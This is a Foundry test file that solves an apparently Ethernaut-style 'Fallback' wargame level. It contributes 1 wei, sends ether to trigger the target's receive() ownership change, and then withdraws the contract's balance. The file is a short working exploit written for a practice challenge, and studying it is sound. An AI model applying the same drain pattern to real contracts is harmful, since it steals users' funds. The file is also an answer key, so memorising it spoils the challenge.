// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IFallback {
  function contribute() external payable;
  function withdraw() external;
}

contract FallbackTest is Test {
  address internal challengeAddress;
  IFallback internal challenge;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F);
    challenge = IFallback(challengeAddress);
  }

  function testExploit() public {
    // make this true
    // contributions[msg.sender] > 0
    challenge.contribute{value: 1 wei}();

    // trigger code in receive()
    (bool success,) = address(challengeAddress).call{value: 1 wei}("");
    require(success, "receiver rejected ETH transfer");

    // See receive() below
    challenge.withdraw();

    utils.submitLevelInstance(challengeAddress);
  }

  // we need a receive function, since we are receiving
  // the funds here and this is not an EOA
  receive() external payable {}
}
